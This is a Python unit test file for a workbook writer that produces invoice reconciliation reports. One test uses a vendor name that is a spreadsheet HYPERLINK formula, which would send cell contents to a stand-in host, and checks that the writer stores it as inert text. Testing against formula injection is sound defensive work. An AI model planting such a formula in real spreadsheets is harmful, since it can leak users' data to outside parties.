"""
description: Unit tests for report_workbook, written to a BytesIO buffer: a vendor name that starts with "=" stays text, and the Summary inspect count matches the headline. Filesystem-free.
last_updated: 2026-11-24
"""

import io
import unittest

import openpyxl
from recon_models import InvoiceRow
from report_format import inspect_items
from report_workbook import WorkbookWriter
from result_factory import line, result

FORMULA = '=HYPERLINK("https://example.com/?d="&A1,"Example")'


def workbook(data: dict) -> openpyxl.Workbook:
    buffer = io.BytesIO()
    WorkbookWriter(data, buffer).write()
    buffer.seek(0)
    return openpyxl.load_workbook(buffer)


class TestWorkbookWriter(unittest.TestCase):
    def test_vendor_formula_is_written_as_text(self) -> None:
        invoice = InvoiceRow(
            invoice_number="INV-1",
            po_number="",
            key="Eng | 6200",
            vendor=FORMULA,
            invoice_date="2026-09-01",
            amount=10.0,
            status="approved",
            posted=False,
            days_unposted=3,
        )
        data = result([line("Eng | 6200", 900.0, 1000.0)], invoices=[invoice])
        cell = next(
            c
            for row in workbook(data)["Invoices"].iter_rows()
            for c in row
            if c.value == FORMULA
        )
        self.assertEqual(cell.data_type, "s")

    def test_summary_inspect_count_matches_headline_count(self) -> None:
        flags = [
            {
                "id": f"F0{i}",
                "tier": "inspect",
                "kind": "overspend",
                "view": view,
                "key": "Eng | 6200",
                "keys": {},
                "amount": 100.0,
                "tests": ["material"],
                "reason": "r.",
                "priority": 1.0,
            }
            for i, view in enumerate(("ytd", "current"), start=1)
        ]
        data = result([line("Eng | 6200", 900.0, 1000.0)], flags=flags)
        summary = workbook(data)["Summary"]
        counts = [
            row[1] for row in summary.iter_rows(values_only=True) if row[0] == "Inspect"
        ]
        self.assertEqual(counts[0], inspect_items(data))


if __name__ == "__main__":
    unittest.main()
